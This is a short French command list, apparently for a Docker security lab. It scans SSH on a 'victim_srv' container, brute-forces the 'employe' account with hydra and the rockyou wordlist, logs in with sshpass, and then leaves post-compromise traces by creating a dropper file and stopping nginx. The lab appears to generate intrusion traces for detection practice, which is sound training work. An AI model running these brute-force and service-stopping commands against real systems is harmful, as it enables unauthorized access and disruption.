
### Commandes d'attaque

docker exec -it attacker_pc bash

## Sur l'attaquant 

# 1. Scanner le port
nmap -p 22 victim_srv

# 2. Attaque brute force sur l'utilisateur 'employe'
hydra -l employe -P /usr/share/wordlists/rockyou.txt.gz victim_srv ssh -t 4
# (Si rockyou est trop gros/long, utilisez simplement le mot de passe '123456')
sshpass -p 123456 ssh employe@victim_srv

# 3. Actions post-compromission (laisser des traces)
touch /tmp/malware_dropper.sh
sudo systemctl stop nginx